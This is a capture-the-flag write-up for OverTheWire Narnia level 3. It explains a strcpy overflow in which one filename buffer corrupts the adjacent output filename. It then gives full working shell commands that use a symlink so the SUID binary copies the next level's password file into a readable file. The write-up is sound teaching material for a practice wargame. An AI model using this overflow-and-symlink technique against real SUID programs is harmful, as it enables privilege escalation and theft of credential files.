# OverTheWire — Narnia Level 3 → 4

> Goal: Get narnia4 password from `narnia3`. Result: **`**********`** (hidden)
> Technique: adjacent buffer overflow (`ifile`→`ofile`) + **symlink** as a privilege bridge.

---

## 1. Connection
```bash
ssh narnia3@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
char ofile[16] = "/dev/null";   // output (fixed, for now)
char ifile[32];                 // input path
char buf[32];
if(argc != 2){ ...; exit(-1); }
strcpy(ifile, argv[1]);         // BUG: no bounds check -> ifile overflows, corrupts ofile
ofd = open(ofile, O_RDWR);
ifd = open(ifile, O_RDONLY);
read(ifd, buf, sizeof(buf)-1);  // 31 bytes from ifile
write(ofd, buf, sizeof(buf)-1); // 31 bytes to ofile
printf("copied contents of %s to a safer place... (%s)\n", ifile, ofile);
```

## 3. Vulnerability — two variables, one string
`ifile[32]` and `ofile[16]` are adjacent (`ifile` at lower, `ofile` at higher address). If
`argv[1]` is longer than 32 bytes, `ifile` overflows and the excess corrupts `ofile`. Since
`ifile` has no null terminator:
- `ifile` (C-string, up to null) = **entire `argv[1]`** → `open(ifile)` opens it.
- `ofile` (overflowed portion) = `argv[1][32..]` → `open(ofile)` opens that.

> 🔑 narnia3 is **SUID narnia4** → `open` runs as euid=narnia4. If you make `ifile` a
> **symlink** pointing to narnia4's password, the program reads it as narnia4 and writes
> it to our readable `ofile`. Symlink = privilege bridge.

## 4. Attack — padding calculation
First 32 bytes = `WD/dirname/` (the 32nd byte is the `/` before `readthis`), rest = `readthis`:
```
argv[1] = "$WD/$DIR/readthis"
          └── first 32 (ifile) ──┘└ ofile="readthis" ┘
len(WD) + 1 + N + 1 = 32   →   N = 30 - len(WD)
```

```bash
WD=$(mktemp -d /tmp/n3XXXX); chmod 755 "$WD"; cd "$WD"     # mktemp -d 700 -> chmod 755 REQUIRED
N=$((30 - ${#WD}))                                          # e.g. WD 11 chars -> N=19
DIR=$(python3 -c "print('A'*$N)"); mkdir "$DIR"; chmod 755 "$DIR"
ln -s /etc/narnia_pass/narnia4 "$WD/$DIR/readthis"         # ifile (full) -> narnia4 pass
touch readthis; chmod 666 readthis                         # ofile = ./readthis (writable)
/narnia/narnia3 "$WD/$DIR/readthis"
cat readthis                                               # narnia4 password (+ garbage bytes, 31-read)
```
Output: `copied contents of /tmp/n3.../AAA.../readthis to a safer place... (readthis)`



## Lessons
| Topic | Note |
|-------|------|
| Two variables, one string | Overflowed `ifile` controls both `ifile`(full)+`ofile`(overflow) simultaneously |
| Symlink privilege bridge | SUID narnia4 follows symlink and reads narnia4 pass |
| Permissions critical | Output `chmod 666`, directories `755` (euid=narnia4 must access); `mktemp -d` is 700 → 755 |
| Padding = path length | Calculate N so that `len(WD)+1+N+1=32` |
